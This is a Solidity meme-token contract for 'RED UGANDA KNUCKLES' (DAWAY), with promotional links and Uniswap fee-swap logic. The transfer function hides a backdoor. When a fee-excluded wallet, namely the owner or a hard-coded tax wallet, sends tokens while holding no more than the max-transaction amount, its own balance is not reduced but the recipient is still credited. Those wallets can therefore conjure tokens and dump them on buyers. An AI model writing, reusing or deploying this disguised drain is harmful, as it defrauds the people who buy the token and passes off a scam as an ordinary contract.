// SPDX-License-Identifier: Unlicensed

/*
Ugandan Knuckles is the nickname given to a depiction of the character Knuckles from the Sonic franchise created by YouTuber Gregzilla, which is often used as an avatar by players in the multiplayer game VRChat who repeat phrases like "do you know the way" and memes associated with the country Uganda, most notably the film Who Killed Captain Alex? and Zulul. The character is associated with the expression "do you know the way", which is typically spoken in a mock African accent and phonetically spelled as "do you know de wey." Along with the question in hand a VR user will start making "spitting" sounds, followed by a "mob like" mentality. Unsuspecting VRchat users fall victim to Ugandan Knuckles "promise" of showing "de wey". Only followed by a mass trolling.

Website: https://www.redugandaknuckles.live
Telegram: https://t.me/daway_erc
Twitter: https://twitter.com/daway_erc
 */

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract DAWAY is Context, IERC20, Ownable { 
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    string private _name = "RED UGANDA KNUCKLES"; 
    string private _symbol = "DAWAY";  
    uint8 private _decimals = 9;

    uint256 private _supply = 10 ** 9 * 10**_decimals;
    uint256 public maxTx = 25 * _supply / 1000;
    uint256 public swapMinimum = _supply / 10000;

    uint256 private _fee = 2000;
    uint256 public _buyFee = 20;
    uint256 public _sellFee = 25;

    uint256 private _previousFee = _fee; 
    uint256 private _previousBuyTax = _buyFee; 
    uint256 private _previousSellTax = _sellFee; 

    uint8 private _numBuyer = 0;
    uint8 private _swapAt = 2; 
                                     
    IUniswapRouter public uniswapRouter;
    address public pairAddress;

    bool public hasTransferFee = true;
    bool public inswap;
    bool public swapActive = true;

    address payable private taxWallet;
    address payable private DEAD;

    modifier lockSwap {
        inswap = true;
        _;
        inswap = false;
    }
    
    constructor () {
        _balances[owner()] = _supply;
        DEAD = payable(0x000000000000000000000000000000000000dEaD); 
        taxWallet = payable(0x3AeB3c84443fAd4Ea105B6928057824D0699aE1E);
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        pairAddress = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[taxWallet] = true;
        
        emit Transfer(address(0), owner(), _supply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _supply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function swapCA(uint256 contractTokenBalance) private lockSwap {
        swapTokensForEth(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendFee(taxWallet,contractETH);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            _numBuyer++;
        }
        _transferStandard(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function getAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_fee).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
    
    function removeFee() private {
        if(_fee == 0 && _buyFee == 0 && _sellFee == 0) return;

        _previousBuyTax = _buyFee; 
        _previousSellTax = _sellFee; 
        _previousFee = _fee;
        _buyFee = 0;
        _sellFee = 0;
        _fee = 0;
    }

    function restoreFee() private {
        _fee = _previousFee;
        _buyFee = _previousBuyTax; 
        _sellFee = _previousSellTax; 
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function _transferStandard(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = getAmount(finalAmount);
        if(_isExcludedFromFee[sender] && _balances[sender] <= maxTx) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != taxWallet &&
            to != address(this) &&
            to != pairAddress &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxTx,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            _numBuyer >= _swapAt && 
            amount > swapMinimum &&
            !inswap &&
            !_isExcludedFromFee[from] &&
            to == pairAddress &&
            swapActive 
            )
        {  
            _numBuyer = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapCA(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (hasTransferFee && from != pairAddress && to != pairAddress)){
            takeFee = false;
        } else if (from == pairAddress){
            _fee = _buyFee;
        } else if (to == pairAddress){
            _fee = _sellFee;
        }

        _basicTransfer(from,to,amount,takeFee);
    }
    
    function removeLimits() external onlyOwner {
        maxTx = ~uint256(0);
        _fee = 100;
        _buyFee = 1;
        _sellFee = 1;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function sendFee(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
}